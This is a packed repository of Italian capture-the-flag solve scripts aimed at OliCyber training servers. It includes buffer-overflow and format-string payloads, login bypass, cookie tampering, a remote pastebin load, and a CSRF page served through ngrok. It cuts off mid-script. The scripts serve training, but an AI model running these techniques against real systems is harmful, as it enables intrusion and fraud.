@@ -1,0 +1,2208 @@
+CTF SENTINEL - INTERNAL KNOWLEDGE BASE AND METHODOLOGIES
+=========================================================
+
+
+
+--- BEGIN FILE: RepoMix/repomix-output-AlBovo-Holyciber-WriteUps.xml ---
+This file is a merged representation of the entire codebase, combined into a single document by Repomix.
+The content has been processed where security check has been disabled.
+
+<file_summary>
+This section contains a summary of this file.
+
+<purpose>
+This file contains a packed representation of the entire repository's contents.
+It is designed to be easily consumable by AI systems for analysis, code review,
+or other automated processes.
+</purpose>
+
+<file_format>
+The content is organized as follows:
+1. This summary section
+2. Repository information
+3. Directory structure
+4. Repository files (if enabled)
+5. Multiple file entries, each consisting of:
+  - File path as an attribute
+  - Full contents of the file
+</file_format>
+
+<usage_guidelines>
+- This file should be treated as read-only. Any changes should be made to the
+  original repository files, not this packed version.
+- When processing this file, use the file path to distinguish
+  between different files in the repository.
+- Be aware that this file may contain sensitive information. Handle it with
+  the same level of security as you would the original repository.
+</usage_guidelines>
+
+<notes>
+- Some files may have been excluded based on .gitignore rules and Repomix's configuration
+- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
+- Files matching patterns in .gitignore are excluded
+- Files matching default ignore patterns are excluded
+- Security check has been disabled - content may contain sensitive information
+- Files are sorted by Git change count (files with more changes are at the bottom)
+</notes>
+
+</file_summary>
+
+<directory_structure>
+Campus ⛺/
+  ACN CTF/
+    ACN 1 - Pets lover/
+      README.md
+    ACN 2 - Strong encryption/
+      flag.py
+    ACN 3 - Partner in crime/
+      README.md
+    ACN 4 - Everything has a price/
+      README.md
+    ACN 5 - ... and a place for exchange/
+      README.md
+    ACN 6 - Reverse me!/
+      flag.py
+    ACN-Challenge.zip
+  Challenges/
+    Camp 1/
+      AWeirdTripToDelphi.py
+      bigof.py
+      CifrarioACaso.py
+      CloudFreeTier.py
+      DHRevisited.py
+      flagvault.py
+      GabibboSays.py
+      IHC-IHateCaptcha!.py
+      L'EnnesimoLoginBypass.py
+      runme.py
+    Camp 2/
+      baby-printf.py
+      Gab-chan.py
+      IlSolitoServizio.py
+      implementationDefined.py
+      INVALSI.py
+      LastMinute.py
+      MEMESHOP.py
+      MEMESHOPReview.py
+      SSHLogin.py
+      strong-as-md5.py
+      strong-as-md5(angr).py
+    Camp 3/
+      baby-encryption.py
+      EnterpriseEncryption.py
+      ÈTuttoSoloUnaConvenzione.py
+      Gabibbo-Kontakte.py
+      GES-GabibboEncodingStandard.py
+      lil-overflow.py
+      PhiQuadro.py
+      pincode.py
+      xornt.py
+  Crypto/
+    Crypto_1_-_Introduzione_alla_crittografia_-_camp1.pdf
+    Crypto_2_-_Basics.pdf
+    Diffie_Hellman_basics.pdf
+    intro-teoria-numberi.pdf
+    pycryptodome_basics.pdf
+    sage_introduction.pdf
+  Misc/
+    linux_commands_table.pdf
+    Miscellaneous_1_-_Introduzione.pdf
+    Miscellaneous_2_-_Python.pdf
+  Network/
+    Network_Security_1_-_Introduzione_alla_network_security.pdf
+    OverTheWirePasswords.txt
+  Software/
+    Software_Security_1_-_Intro_Reversing.pdf
+    Software_Security_2_-_Intro_Pwn.pdf
+  Web/
+    WS_1.Il_protocollo_HTTP.pdf
+    WS_2.Database.pdf
+    WS_3.XSS.pdf
+  OliCyber.IT_2023_-_Training_Camp_2_-_Writeup_Challenge.pdf
+Challenges 🕹️/
+  Crittografia 🔑/
+    1337_XOR.py
+    BabyAES.py
+    Berserker.py
+    CAMH.py
+    ChineseRSA.py
+    ClassicChiper.py
+    CorruptedKeyExchange.py
+    CriptORiAND.py
+    CryptingOnStructure.py
+    flipMyWords.py
+    ILikeHashes.py
+    ilTempoEDenaro.py
+    laMemoriaDiBOB.py
+    Maturity.py
+    ModesDiff.py
+    NiceRSA.py
+    PiuPotenzaDiCalcolo.py
+    PrivateIV.py
+    ProbablyASimpleSiveWontBeEnough.py
+    RestlessSooperArmy.py
+    RSALaPrimaChiave.py
+    SandwichMaster.py
+    SecureKeyGenerator.py
+    SimilarKeyBigProblem.py
+    SmallRSA.py
+    TutteLeStradePortanoARoma.py
+    VeryStrongVigenere.py
+  Miscellaneous 🎯/
+    2048.py
+    BasedAndEncoded.py
+    BelPaessaggio.md
+    BrightSun.md
+    Byte-flag.py
+    CorruptedFlag.py
+    Dashed.py
+    ExecuteMe.py
+    GuessWhere.md
+    InfiniteServer.py
+    SuoniMisteriosi.py
+    VillaPisani.py
+    Zipception.py
+    Zipception2.0.py
+  Network Security 🕸️/
+    Chaos.py
+    DNSEmailSecurity.md
+    QuantumTransportLayer.sh
+    SniffNByte.py
+    SSA0x42.py
+    thatsALotOfFs.py
+    Useless.py
+    wordwang.py
+    YouCompleteMe.py
+  Software Security ⚙️/
+    asmr.py
+    augharder.py
+    blockypics.py
+    coffee_hash.py
+    crackmat.py
+    dogeRansom.py
+    dogeRansom2.py
+    emergency-call.py
+    Formatted.py
+    GeneratorePocoCasuale.py
+    GuessTheNumber.py
+    GuessTheNumber2.py
+    keygenme.py
+    morePrivateClub.py
+    readdle.py
+    reverSPN.py
+    secret_vault.py
+    super_market.py
+    supermegaiperencryption.py
+    terminator.py
+  Web Security 🌐/
+    iforgot/
+      lasciare solo .git/
+        info/
+          exclude
+        logs/
+          refs/
+            heads/
+              master
+          HEAD
+        objects/
+          5f/
+            8a887f521b9e153d07657fe408c931d36bb6cc
+          94/
+            56de70710a02489c44f104fb2b002cc08bf31a
+          98/
+            89ea2ff41ccec1f57dd2d56825a4b75003649e
+        refs/
+          heads/
+            master
+        COMMIT_EDITMSG
+        config
+        description
+        HEAD
+        index
+      index.js
+      package.json
+      README.md
+      robots.txt
+    ATooSmallReminder.py
+    BasicSQLi.py
+    C-StyleLogin.py
+    ClickMe.py
+    ConfuseMe.py
+    Cookiemonster.py
+    FlagsShop.py
+    Headache.py
+    IGotMagic.py
+    JustAReminder.js
+    LightOrDark.py
+    MakeAWish.py
+    NoRobotsHere.py
+    PasswordChanger3000.py
+    RickRoller.py
+    ShellsRevenge.php
+    ShellsRevenge2.php
+    SitoVuoto.py
+    Sn4ckSh3nan1gans.py
+    TimeIsKey.py
+    TIMP.py
+    TrulyRandomSignature.py
+Introduzione/
+  Crittografia 🔐/
+    Crypto 01 - Encoding 1.py
+    Crypto 02 - Encoding 2.py
+    Crypto 03 - Encoding 3.py
+    Crypto 04 - Xor 1.py
+    Crypto 05 - Xor 2.py
+    Crypto 07 - PyCryptutorial 1.py
+    Crypto 08 - Congruenze Modulari.py
+    Crypto 09 - Inverso Modulare.py
+    Crypto 10 - CRT.py
+    Crypto 12 - DH helpline.py
+    Crypto 13 - A Diffiecult communication.py
+    Crypto 14 - PyCryptutorial 2.py
+  Miscellaneous 🎲/
+    Misc 01 - Sanity Check.md
+    Misc 02 - Suggerimenti.md
+    Misc 03 - Allegati.md
+    Misc 04 - Sito web.md
+    Misc 05 - Servizio tcp.md
+    Misc 07 - Basic Bash.md
+  Network Security 🕸️/
+    Network 01 - Pcap.md
+    Network 02 - Dettagli.md
+    Network 03 - Filtri 1.md
+    Network 04 - Filtri 2.md
+    Network 05 - Filtri 3.md
+    Network 06 - Filtri 4.md
+    Network 07 - Stream TCP.md
+    Network 08 - Estrazione di bytes.md
+    Network 09 - Decifrare traffico TLS.md
+    Network 10 - Esporta oggetti.md
+  Software Security ⚙️/
+    Software 17 - Pwntools 1.py
+    Software 18 - Pwntools 2.py
+    Software 19 - Pwntools 3.py
+    Software 20 - Pwntools 4.py
+  Web Security 🌐/
+    Web 01 - HTTP - una semplice richiesta GET.py
+    Web 02 - HTTP - richiesta GET con query string.py
+    Web 03 - HTTP - richiesta GET con header manuale.py
+    Web 04 - HTTP - l'header Accept.py
+    Web 05 - HTTP - cookie manuale.py
+    Web 06 - HTTP - ricevere un cookie.py
+    Web 07 - HTTP - il metodo HEAD.py
+    Web 08 - HTTP - una richiesta post tradizionale.py
+    Web 09 - HTTP - una richiesta POST con body JSON.py
+    Web 10 - HTTP - il metodo OPTIONS.py
+    Web 11 - HTTP - i token CSRF.py
+    Web 12 - Tecnologie web - estrarre semplici contenuti da una pagina web.py
+    Web 13 - Tecnologie web - estrarre elementi da una pagina web.py
+    Web 14 - Tecnologie web - estrarre commenti da una pagina web.py
+    Web 15 - Tecnologie web - risorse esterne.py
+    Web 16 - Tecnologie web - un semplice spider.py
+    Web 17 - SQLi 1 - logic SQL injection.py
+    Web 18 - SQLi 2 - UNION based SQL injection.py
+    Web 19 - SQLi 3 - blind SQL injection.py
+    Web 20 - SQLi 4 - time-based SQL injection.py
+m0leCon 2020 🏆/
+  blacky_echo.py
+  knife.py
+m0leCon 2021 🏆/
+  Beginner/
+    Connexion1.py
+    Connexion2.py
+    delphi.py
+    Hidy.py
+    howLuckyAreYou.py
+    MyFirstWebsite.py
+    StaticWebFoundation.py
+  Teaser/
+    andry.py
+    m0leCon+.py
+    NTMaster.py
+m0leCon 2022/
+  cryptoservice.py
+  determinationKey.py
+  floppyBird.py
+  linearMyWatson.py
+  magicNotCrypto.py
+  ptmSafe.py
+  ssa.py
+  transferNotes.py
+  unrecognizeable.py
+m0lecon 2023/
+  ANDCipher.py
+  CrazyXOR.py
+  FastRSA.py
+  memoryWizard.py
+  oursql.py
+  pianoCarriera.py
+  PolitoCheatBot.py
+  secureAccess.py
+  theWall.py
+  unguessable.py
+Olicyber 2021 🏆/
+  Benvenvti!.py
+  CAPTCHA.py
+  DispositivoNonSicuro.py
+  FlagDownloader1.py
+  FlagDownloader2.py
+  formatter1.py
+  formatter2.py
+  FormSicurissimo.py
+  FrittoMisto1.py
+  HackersCaptcha.py
+  IlTestDiAmmissione.py
+  KangarooSecurity.py
+  largeBitRSA.py
+  laSettimanaEnigmistica1.py
+  lostkey_patched
+  MaledettaBiondi.py
+  powersOfpowers.py
+  predatori1.py
+  predatori2.py
+  SmallBitsOfRSA.py
+  smallLSFR.py
+  SoundOfSilence.py
+  SoundOfSystem.py
+  tr(A)Is.py
+  UBSPassword.py
+  virtualBank.py
+Olicyber 2022 🏆/
+  Nazionale/
+    2fa.py
+    2fa++.py
+    adminPanel.py
+    adminPanel2.py
+    babydh.py
+    ControlloRicorsivo.py
+    DatiPrivati.cpp
+    Frontdoor1-2.py
+    GGOL1.py
+    hackerino.py
+    OTP-as-a-Service 1.py
+    OTP-as-a-Service2.py
+    Postino.py
+    PoW.py
+    RompiSchemiAsimmetrici.py
+    RSAMoltoParticolare.py
+    RSwAp.py
+    SNECC1.py
+    SNECC2.py
+    Splashbox1.py
+    Splashbox2.py
+  Territoriale/
+    ABcon.py
+    babyoracle.py
+    BaseParty.py
+    BigBird.py
+    Block1337.py
+    DoYouBelieveInMagic.py
+    EasyNotes.py
+    EasyShop.html
+    encryptedLine.py
+    FlagPass.js
+    FlagPass.py
+    HiAdmin.py
+    NaaS.py
+    NFTGallery.py
+    Rincorro.py
+    Stripped.py
+Olicyber 2023 🏆/
+  Nazionale/
+    Secret Archive/
+      go.mod
+      history.php
+      index.php
+      main.go
+      searcher.php
+      secretArchive.py
+    Geroglifici.py
+    guess_master.py
+    Privnotes.py
+    Proposte.py
+    Sandbox-v1.py
+    Sandbox-v2.py
+  Territoriale/
+    ClassicamentePython.py
+    debug_disabilitato.py
+    flagInterceptor.py
+    fritto-disordinato.py
+    GabibbosFriend.py
+    GabibbosTreasure.py
+    IndovinANDoSegreti.py
+    Polynot1305.py
+    Super-licenza.py
+Olicyber 2024 🏆/
+  Nazionale/
+    AffiliatedStore.py
+    aroundTheWorld.py
+    chooseOTP.py
+    dragonFightersClub.py
+    MIC.py
+    nextflag.py
+    phishing.py
+  Territoriali/
+    ageCalculatorPro.py
+    ARXDesigner.py
+    easyLogin.py
+    ghost.py
+    montyHall.py
+    prettyPlease.py
+    randomCyclesBaby.py
+    section31.py
+    secureFileManager.py
+Olicyber 2025 🏆/
+  Nazionali/
+    censored.py
+    colors.py
+    coolifier.py
+    llt.py
+    ntlfs.py
+    sodium.py
+    spa.py
+    web3.md
+  Territoriali/
+    again.py
+    baity5.py
+    bashinatorRevenge.py
+    insecurePassGen.py
+    laPazienzaNonEIlMioForte.py
+    magicBlackBox.py
+    rwPlayground.py
+    secretStorage.py
+    segnalazioneCinghiali.py
+    spg.py
+    trasportandoFile.py
+Olicyber 2026 🏆/
+  Territoriali/
+    crypto01.py
+    crypto02.py
+    crypto03.py
+    misc03.py
+    pwn02.py
+    pwn03.py
+    web03.py
+TeamItaly CTF 2022/
+  FlagProxy.py
+  LazyPlatform.py
+TeamItaly CTF 2023/
+  SuperAdminPanel.py
+TeamItaly CTF 2024/
+  smaugRealEstate.py
+Tools/
+  genpwn.py
+.gitignore
+LICENSE
+README.md
+</directory_structure>
+
+<files>
+This section contains the contents of the repository's files.
+
+<file path="Campus ⛺/ACN CTF/ACN 1 - Pets lover/README.md">
+Per risolvere questa chall bisogna andare ad aprire tutti i pdf dei profili dati nel .zip e provare tutti i nomi degli animali, in questo caso la password è <code>Chippy</code> (gatto di Jane Kerry) quindi la flag sarà <code>***acn{Chippy}***</code>
+</file>
+
+<file path="Campus ⛺/ACN CTF/ACN 2 - Strong encryption/flag.py">
+def checkKey(key): # dato dal README.md
+    if key < 0:
+        return False
+    if key > 25:
+        return False
+    if (key - 10) > 10 :
+        return False
+    a = (key * 257)
+    key = key - 7  
+    b = (key * 406) + 11  
+    if a == b:
+        return True
+    return False
+
+shift = 0
+for i in range(26):
+    if checkKey(i):
+        print(i) # 19
+        shift = i*-1
+        break
+plain = """Vbth, lhgh ikxhvvnitmt vax vb lmbtgh lvhikxgwh.
+Lh vax be kxitkmh BM lmt etohktgwh lne ybex bg teexztmh ixk vtibkx vab x lmtmh be vheixohex.
+Kbxlvb t vtibkx lx mkhoxktggh et ghlmkt x-ftbe x be ybex vax mb ah bgobtmh?
+
+Itllphkw sbi: ynefbvhmhgx"""
+for i in plain:
+    if i in "abcdefghijklmnopqrstuvwxyz":
+        print(chr(((ord(i)+shift)-ord('a'))%26+ord('a')), end="")
+    elif i in "abcdefghijklmnopqrstuvwxyz".upper():
+        print(chr(((ord(i)+shift)-ord('A'))%26+ord('A')), end="")
+    elif i in "0123456789":
+        print(chr(((ord(i)+shift)-ord('0'))%10+ord('0')), end="")
+    else:
+        print(i, end="")
+''' La flag è quindi acn{fulmicotone} '''
+</file>
+
+<file path="Campus ⛺/ACN CTF/ACN 3 - Partner in crime/README.md">
+Guardando il frame n.13 del file ottenuto dallo zip criptato possiamo vedere che l'email è stata mandata Jane Kerry a un anonimo con email <code>tbisset@tempmail.com</code>, possiamo quindi vedere che il cognome Bisset è presente nei pdf in allegato, ci basta quindi solo trovare il nome e abbiamo ottenuto la flag ovvero: <code>***acn{Teo Bisset}***</code>
+</file>
+
+<file path="Campus ⛺/ACN CTF/ACN 4 - Everything has a price/README.md">
+Per ottenere la flag di questa chall basta di nuovo scorrere tutto il frame n.13 fino a che non vediamo scritto in chiaro il costo della transazione ovvero <code>10000$</code> quindi la flag finale sarà: <code>***acn{10000}***</code>
+</file>
+
+<file path="Campus ⛺/ACN CTF/ACN 5 - ... and a place for exchange/README.md">
+Per risolvere pure questa chall bisogna guardare questa volta il frame n.10 possiamo vedere nel link di google maps il posto che stiamo cercando ovvero <code>Piazza Del Popolo, Roma, Italia</code> la flag che stiamo cercando sarà quindi semplicemente: <code>acn{Piazza Del Popolo}</code>
+</file>
+
+<file path="Campus ⛺/ACN CTF/ACN 6 - Reverse me!/flag.py">
+# estraendo l'elf dal file wireshark possiamo reversarlo e trovare la flag
+def xor(a, b): # template di xor (c'è sul sito di olicyber)
+    return bytes([x^y for x,y in zip(a,b)])
+
+v1 = "6975797472657771"
+v2 = "19184937090b1410"
+print(xor(bytes.fromhex(v1), bytes.fromhex(v2)).decode()) # spero sia quella giusta lol non l'hanno detta quella giusta
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 1/AWeirdTripToDelphi.py">
+#!/usr/bin/env python3
+from pwn import remote, xor
+import re
+
+REGEX = r'flag{.*?}'.encode()
+
+r = remote("trip-to-delphi.challs.olicyber.it", 34007)
+r.recvuntil(b'iv.hex() = \'')
+iv = r.recvuntil(b'\'', True)
+r.recvuntil(b'enc_flag.hex() = \'')
+enc_flag = r.recvuntil(b'\'', True)
+
+iv_test = bytes.fromhex(iv.decode())
+flag_t = [enc_flag[i:i+32] for i in range(0, len(enc_flag), 32)]
+flag_t += [iv] + flag_t
+flag_t = b''.join(flag_t)
+
+r.recvuntil(b'iv (hex): ')
+r.sendline(iv)
+r.recvuntil(b'ciphertext (hex): ')
+r.sendline(flag_t)
+
+r.recvuntil(b'oracle(ciphertext, iv).hex() = \'')
+flag = r.recvuntil(b'\'', True)
+flag = bytes.fromhex(flag.decode())[7:]
+flag = xor(flag[0:16], flag_t[0]) + flag[16:]
+flag = re.findall(REGEX, flag)[0]
+print(flag.decode())
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 1/bigof.py">
+from pwn import *
+r = remote("big-overflow.challs.olicyber.it", 34003)
+r.recv(100)
+payload = b'a'*31
+r.sendline(payload)
+r.recvline()
+ex = r.recvuntil(b"but").replace(b"but", b"")
+gab = p32(0x5ab1bb0, endian="little")
+print(ex + b"  " + gab)
+r.recv()
+r.send(b'a'*32 + ex + 2 * b"\x00" + gab)
+r.recv()
+print(r.recv())
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 1/CifrarioACaso.py">
+#!/usr/bin/env python3
+import random
+
+flagEncrypted = "088596df93697e62d71cb143352ccb45be15463219c6cc917f9be83c1aa1f7d0217b4586c1058009"
+
+def find_key(flag):
+    for i in range(256):
+        ciphertext = []
+        random.seed(i)
+
+        for c in flag:
+            encrypted_char = c ^ random.randint(0, 255)
+            ciphertext.append(encrypted_char)
+        if "088596df93" in bytes(ciphertext).hex(): # 088596df93 == flag{ encoded in hex
+            return i
+
+def decrypt(key):
+    flag = []
+    random.seed(key)
+
+    for c in bytes.fromhex(flagEncrypted):
+        flag.append(c ^ random.randint(0, 255))
+
+    return bytes(flag).decode()
+
+key = find_key(b"flag{")
+print(key)
+print(decrypt(key))
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 1/CloudFreeTier.py">
+import requests, re
+
+site = "http://cloud_free_tier.challs.olicyber.it"
+s = requests.Session()
+s.post(site + "/register", data={"username":"sas123sas", "password":"sas123sas", "repeat_password":"sas123sas"})
+s.post(site + "/login", data={"username":"sas123sas", "password":"sas123sas"})
+print(s.cookies.get_dict())
+r = s.post(site + "/run", data={"file":"/logout?redirect=https://pastebin.com/raw/XJ0MvVrv"})
+flag = re.findall(r"flag{.*?}", r.text)[0]
+print(flag)
+'''
+flag = open("../../flag.txt")
+print(flag.read())
+'''
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 1/DHRevisited.py">
+#!/usr/bin/env python3
+
+from z3 import *
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+''' da input '''
+g = 126410689802884623988756200712033318972
+A = 52231676617151166420364050960016472553
+B = 9306272951250678880959738917375588033
+iv = bytes.fromhex('39e9c1023681591d13604a1964cdf62f')
+enc_flag = bytes.fromhex('66fc9e95577c38f8a2153e1e7e96be950c1eabd46d8b70a6304fd1b81b70be5f')
+
+s = Solver()
+
+def o(x, y):
+    return x + y - 2*(x&y)
+
+a, b = BitVecs('a b', 128)
+s.add(A == o(g, a))
+s.add(B == o(g, b))
+s.add(o(a, B) == o(b, A))
+print(s.check())
+m = s.model()
+a1, b1 = m[a].as_long(), m[b].as_long()
+sharedAlice = o(a1, B)
+sharedBob = o(b1, A)
+print(sharedAlice, sharedBob)
+assert sharedAlice == sharedBob
+flag = AES.new(sharedAlice.to_bytes(16, "big"), AES.MODE_CBC, iv).decrypt(enc_flag)
+print(unpad(flag, 16))
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 1/flagvault.py">
+from pwn import *
+r = remote("flagvault.challs.olicyber.it",34000)
+r.recv()
+r.sendline("49CMO:N?O2CD".encode())
+print(r.recv())
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 1/GabibboSays.py">
+#!/usr/bin/env python3
+import requests, re
+
+SITE = "http://gabibbo-says.challs.olicyber.it/"
+REGEX = r"flag{.*?}"
+
+r = requests.post(SITE, data={"gabibbo":"angry"})
+flag = re.findall(REGEX, r.text)[0]
+print(flag)
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 1/IHC-IHateCaptcha!.py">
+#!/usr/bin/env python3
+
+from pwn import *
+import re
+
+r = remote("ihc.challs.olicyber.it", 34008)
+r.recvuntil(b'invio!')
+r.sendline()
+t = r.recvuntil(b'Risposta: ').decode()
+flag = ''
+
+while not "}" in t.lower():	
+	f = re.search(r':\s(.)(?=\n)', t)
+	if f:
+		flag += f.group(1)
+		print(flag)
+		if f.group(1) == '}':
+			exit(0)
+	if "Quante volte compare" in t:
+		l = re.search(r'lettera\s(.+?)\snella', t).group(1)
+		s = re.search(r'stringa\s(.+)', t).group(1)
+		print(f'("query":0, "lettera":"{l}", "stringa":"{s}")')
+		r.sendline(str(s.count(l)).encode())
+	elif "stringa al contrario" in t:
+		s = re.search(r':\s(.+)', t).group(1)
+		print(f'("query":1, "stringa":"{s}")')
+		r.sendline(s[::-1].encode())
+	elif "nelle posizioni" in t:
+		array = eval("[" + re.search(r'\[(.*?)\]', t).group(1) + "]")
+		s = re.search(r'stringa\s(.+)', t).group(1)
+		print(f'("query":2, "array":"{str(array)}", "stringa":"{s}")')
+		f = ''
+		for i in array:
+			f += s[i-1] 
+		r.sendline(f.encode())
+	elif "Qual è il risultato" in t:
+		exp = re.search(r'(\d+\s*[\+\-\*/]\s*\d+)', t).group(1)
+		print(f'("query":3, "exp":"{exp}")')
+		r.sendline(str(int(eval(exp))).encode())
+	else:
+		print(t)
+		exit(0)
+	t = r.recvuntil(b'Risposta: ').decode()
+print(flag + '}')
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 1/L'EnnesimoLoginBypass.py">
+#!/usr/bin/env python3
+import requests, re
+
+SITE = "http://ennesimo_login_bypass.challs.olicyber.it/"
+REGEX = r"flag{.*?}"
+
+r = requests.post(SITE, data={"password[]":"dammiLaFlag"})
+flag = re.findall(REGEX, r.text)[0]
+print(flag)
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 1/runme.py">
+#!/usr/bin/env python3
+from pwn import *
+
+p = process("./runme")
+p.recvline()
+p.sendline(b'33')
+print(p.recv().decode().strip())
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/baby-printf.py">
+#!/usr/bin/env python3
+from pwn import process, remote, p64, args
+
+if args.REMOTE:
+    p = remote('baby-printf.challs.olicyber.it', 34004)
+else:
+    p = process('./babyprintf', env={'FLAG':"flag{lol}"})
+
+PAYLOAD1 = b'%11$p.%15$p' # canary.address of main
+p.recvuntil(b'back:\n')
+p.sendline(PAYLOAD1)
+risp = p.recvuntil(b'\n').split(b'.')
+canary = p64(int(risp[0], 16))
+main = int(risp[1], 16) - 54 # address of win
+PAYLOAD = b'a'*40 + canary + b'a'*8 + p64(main)
+p.sendline(PAYLOAD)
+p.recv()
+p.sendline(b'!q')
+p.interactive()
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/Gab-chan.py">
+#!/usr/bin/env python3
+
+import os
+
+os.system("stegolsb steglsb -r -i Gab-chan.png -o file.zip") # pip install stego-lsb
+os.system('unzip -P "VjyQ[6M8WFx[sLCT" file.zip') # unzippo
+with open("flag.txt", "r") as flag:
+    print(flag.read()) # printo la flag
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/IlSolitoServizio.py">
+from z3 import *
+from pwn import *
+from Crypto.Util.number import bytes_to_long
+
+p = 290413720651760886054651502832804977189
+pub_key = 285134739578759981423872071328979454683
+c = bytes_to_long("get_flag".encode())
+sign = Int("signature")
+s = Solver()
+s.add((pub_key * sign) % p == c)
+s.check()
+m = s.model()[sign].as_long()
+r = remote("il-solito-servizio.challs.olicyber.it", 34006)
+r.recv()
+r.sendline(b"1")
+r.recv()
+r.sendline(str(m).encode())
+r.recvuntil(b"flag!\n")
+print(r.recvuntil(b"}").decode())
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/implementationDefined.py">
+from pwn import *
+key = bytes.fromhex("f30f1efa4883ec08488b05d92f00004885c07402ffd04883c4")
+flag = b"\x95\x63\x7f\x9d\x33\xb2\xd9\x57\x3c\xe3\x34\xec\x70\x63\x30\x2c\xb6\x9f\x44\x70\xa0\xbe\x78\xf7\xb9"
+print(xor(key, flag).decode())
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/INVALSI.py">
+import requests, re
+from multiprocessing.dummy import Pool
+
+REGEX = r"flag{.*?}"
+
+pool = Pool(3)
+site = "http://invalsi.challs.olicyber.it/"
+s = requests.Session()
+s.get(site)
+da = ["0","1","2","3","4","5","6","7","8","9"]
+
+futures = []
+for x in range(3):
+    futures.append(pool.apply_async(s.post, [site], {"json":da}))
+for future in futures:
+    future.get()
+r = s.get(site + "flag").text
+print(re.findall(REGEX, r)[0])
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/LastMinute.py">
+from base64 import b64decode
+t = "Vm0wd2QyUXlWa2hWV0doVllteEtWMVl3WkRSWFJteFZVbTVrVmxKc2NIcFhhMk0xVmpGS2RHVkdXbFpOYm1oUVdWZDRTMk14VG5OWGJHUlRUVEZLVVZkV1kzaFRNVWw0V2toV2FGSnRVbFJVVkVaTFZWWmtWMWRzV214U2JHdzBWMnRvVjJGV1NuUlZia0pXWWxoU00xVXhXbXRXTVdSMFVteHdWMDFWY0VsV2JUQXhWREpHVjFOdVZsSmhlbXhYV1d4b2IxWXhjRlpYYlhSWFRWaENTbGt3WkRSVk1ERkZWbGhrVjJFeVVYZFhWbHByVTBaT2NtRkdXbWxTYTNCdlZtMXdUMVV5UmtkaVNFWlRZbGhTV0ZSV1pGTk5SbFowWlVaT1ZXSkdjRnBWVjNCWFZqRkplbUZIYUZwaGExcFVXWHBHYTJSV1ZuUmhSazVwVmpKb1dWWXhaREJoTWtsNFUydGtWbUpIVWxsWmJGWmhWa1pTVjFkdVpFNVNia0pIVmpKNFQxWlhTa2RqUmxwWFlsaFNNMVpxU2t0U01rNUpWMjFHVTFKWVFrbFhXSEJIVkRGa1dGTnJhR3hTYkVwVVZteG9RMWRzV1hoWGJYUk9VbXR3TUZaV2FHOVdiVXBJWVVoT1ZtSlVWa1JaTW5oVFZqRmtkRkp0ZUZkaWEwcElWbTE0VTFJeFdsaFRhMXBxVWxkU1dGUlhOVk5sYkZweFVWaG9hMVpyV25wVlZ6RkhWVEZLVjJOSE9WZGlXRUpJV2tSR1MyUkdUbkphUmxKcFZqTm9kbFpHV205Uk1rbDRWMjVTVGxkSFVsWlVWM1J6VGtaYVdHUkhkR2hXYXpWSFZHeGFjMWR0U2xsVmFrNWFUVzVvVkZZd1pGTlRSa3B6VkdzMVYwMHhSalpXYWtvd1ZURlZlRmR1U2s1V1ZscFVXVlJPUTFZeFduRlViVGxxWWtad2VGVXlkREJXUmtwelYyNW9WMUl6YUROV1J6RkxaRWRHUmxac1pHbFNNVVYzVmxaU1IxbFdXbkpOVmxwWFlYcFdWRlZyVmtaT1VUMDk="
+while not "flag" in t:
+    t = b64decode(t).decode()
+print(t)
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/MEMESHOP.py">
+#!/usr/bin/env python3
+import requests, re
+from base64 import b64decode, b64encode
+
+SITE = "http://meme_shop.challs.olicyber.it/"
+REGEX = r"flag{.*?}"
+
+s = requests.Session()
+
+s.post(SITE + "register.php", data={"username":"sos123sos", "password":"sos123sos", "passwordConfirm":"sos123sos", "submit":"Registrati"})
+s.post(SITE + "login.php", data={"username":"sos123sos", "password":"sos123sos", "submit":"Login"})
+s.post(SITE + "add_to_cart.php", data={"item_id":"1"})
+t = eval(b64decode(str(s.cookies.get_dict()["cart"]).encode()).decode())
+t["flag"]["price"] = -1
+cookie = {"PHPSESSID":s.cookies.get_dict()["PHPSESSID"], "cart": b64encode(str(t).replace("'",'"').replace(" ","").encode()).decode().replace("=","")}
+s.cookies = requests.utils.cookiejar_from_dict(cookie)
+r = s.post(SITE + "checkout.php")
+if not "flag" in r.text:
+    print("Error")
+else:
+    flag = re.findall(REGEX, r.text)[0]
+    print(flag)
+</file>
+
+<file path="Campus ⛺/Challenges/Camp 2/MEMESHOPReview.py">
+#!/usr/bin/env python3
+import requests, re, time
+from subprocess import Popen, PIPE
+
+SITE = "http://meme_shop_review.challs.olicyber.it/"
+REGEX = r"flag{.*?}"
+IDREGEX = r"<option value=\"(\d+)\">sos123sos</option>"
+MONREGEX = r":(\d+) €"
+payload = '''
+<html>
+    <head>
+        <title>^_^</title>
+    </head>
+    <body>
+        <form action="http://meme_shop_review.challs.olicyber.it/refund.php" method="POST">
+            <textarea name="user_id">{id}</textarea>
+            <textarea name="amount">1000</textarea>
+            <textarea name="submit">Riscatta</textarea>
+            <button type="submit" id="sas"></button>
+        </form>
+        <script>document.getElementById("sas").click()</script>
+    </body>
+</html>
+'''.strip() # html da scrivere nel sito dell'attaccante
+
+s = requests.Session()
+s.post(SITE + "register.php", data={"username":"sos123sos", "password":"sos123sos", "passwordConfirm":"sos123sos", "submit":"Registrati"})
+s.post(SITE + "login.php", data={"username":"sos123sos", "password":"sos123sos", "submit":"Login"})
+
+r = s.get(SITE + "refund.php")
+id = re.findall(IDREGEX, r.text)[0]
+
+with open("index.html", "w") as f:
+    f.write(payload.format(id=id))
+server = Popen(["python3", "-m", "http.server"], stdout=PIPE, stderr=PIPE)
+ngrok = Popen(["ngrok", "tcp", "8000"], stdout=PIPE, stderr=PIPE)
+time.sleep(2) # letteralmente "aspetta due secondi"
+site = requests.get("http://127.0.0.1:4040/api/tunnels").text
+print(site)
